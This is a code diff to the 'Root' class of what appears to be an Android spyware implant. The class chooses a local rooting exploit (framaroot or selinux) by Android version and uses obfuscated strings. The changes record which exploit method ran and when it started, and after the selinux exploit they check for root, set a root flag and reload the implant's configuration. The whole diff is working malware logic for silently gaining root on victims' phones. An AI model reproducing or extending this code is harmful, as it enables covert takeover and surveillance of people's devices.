@@ -10,6 +10,7 @@ import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
 import java.util.Arrays;
+import java.util.Date;
 import java.util.List;
 import java.util.Properties;
 
@@ -37,6 +38,8 @@ import com.android.m.M;
 
 public class Root {
 	private static final String TAG = "Root";
+	public static String method = "";
+	public static Date startExploiting = new Date();
 	static public boolean isNotificationNeeded() {
 		if (Cfg.OSVERSION.equals("v2") == false) {
 			int sdk_version = android.os.Build.VERSION.SDK_INT;
@@ -82,19 +85,21 @@ public class Root {
 	}
 
 	static public void exploitPhone() {
+		method = M.e("previous");
 		if (Root.isRootShellInstalled() == true) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(exploitPhone): root shell already installed, no need to exploit again");
 			}
-
+			
 			return;
 		}
 
+		startExploiting = new Date();
 		if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.ECLAIR_MR1) { 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(exploitPhone): Android <= 2.1, version too old");
 			}
-
+			method = M.e("old");
 			return;
 		} else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.FROYO
 				&& android.os.Build.VERSION.SDK_INT <= 13) { // FROYO - HONEYCOMB_MR2
@@ -107,7 +112,7 @@ public class Root {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (exploitPhone): Device seems locally exploitable"); //$NON-NLS-1$
 				}
-
+				method = M.e("framaroot");
 				framarootExploit();
 			}
 		} else if (android.os.Build.VERSION.SDK_INT >= 14 && android.os.Build.VERSION.SDK_INT <= 17) { // ICE_CREAM_SANDWICH
@@ -122,7 +127,7 @@ public class Root {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (exploitPhone): Device seems locally exploitable"); //$NON-NLS-1$
 				}
-
+				method = M.e("framaroot");
 				framarootExploit();
 			}
 
@@ -135,7 +140,7 @@ public class Root {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (exploitPhone): SELinux Device seems locally exploitable"); //$NON-NLS-1$
 					}
-
+					method = M.e("selinux");
 					selinuxExploit();
 				}
 			}
@@ -148,7 +153,7 @@ public class Root {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (exploitPhone): SELinux Device seems locally exploitable"); //$NON-NLS-1$
 				}
-
+				method = M.e("selinux");
 				selinuxExploit();
 			}
 		} else if (android.os.Build.VERSION.SDK_INT >= 19) { // KITKAT+
@@ -910,7 +915,10 @@ class selinuxExploitThread implements Runnable {
 							Check.log(TAG + "(run): exploitation terminated after "
 									+ (System.currentTimeMillis() - curTime) / 1000 + " seconds");
 						}
-
+						if(PackageInfo.checkRoot()){
+							Status.setRoot(true);
+							Core.self().reloadConf();
+						}
 						break;
 					}
 
@@ -923,6 +931,7 @@ class selinuxExploitThread implements Runnable {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " ERROR: (run), cannot create script");
 				}
+				PackageInfo.checkRoot();
 			}
 
 			File file = new File(Status.getAppContext().getFilesDir(), localExploit);
